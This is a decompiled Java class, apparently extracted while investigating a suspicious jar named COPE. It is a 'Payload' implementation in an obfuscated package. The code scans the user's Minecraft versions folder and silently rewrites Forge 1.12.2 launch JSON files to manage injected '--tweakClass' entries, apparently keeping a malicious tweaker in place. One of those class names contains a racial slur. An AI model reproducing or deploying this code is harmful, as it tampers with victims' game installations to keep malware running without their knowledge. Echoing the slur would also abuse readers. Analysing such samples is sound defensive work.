/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import java.io.File;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.nio.file.Files;
/*    */ import java.nio.file.Paths;
/*    */ import java.util.Objects;
/*    */ 
/*    */ 
/*    */ public final class DuplicateRemover
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 15 */     File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
/* 16 */     if (file2.isDirectory())
/*    */     {
/* 18 */       for (File file1 : (File[])Objects.<File[]>requireNonNull(file2.listFiles())) {
/*    */         
/* 20 */         if (file1.isDirectory())
/*    */         {
/* 22 */           for (File file : (File[])Objects.<File[]>requireNonNull(file1.listFiles())) {
/*    */             
/* 24 */             if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
/*    */               
/* 26 */               String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath(), new String[0])), StandardCharsets.UTF_8);
/* 27 */               if (json.contains(" --tweakClass me.nigger.tweaker.Tweaker") && json.contains(" --tweakClass net.minecraftforge.modloader.Tweaker"))
/*    */               {
/* 29 */                 Files.write(Paths.get(file.getAbsolutePath(), new String[0]), json.replace(" --tweakClass me.nigger.tweaker.Tweaker", "").getBytes(StandardCharsets.UTF_8), new java.nio.file.OpenOption[0]);
/*    */               }
/*    */             } 
/*    */           } 
/*    */         }
/*    */       } 
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\DuplicateRemover.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */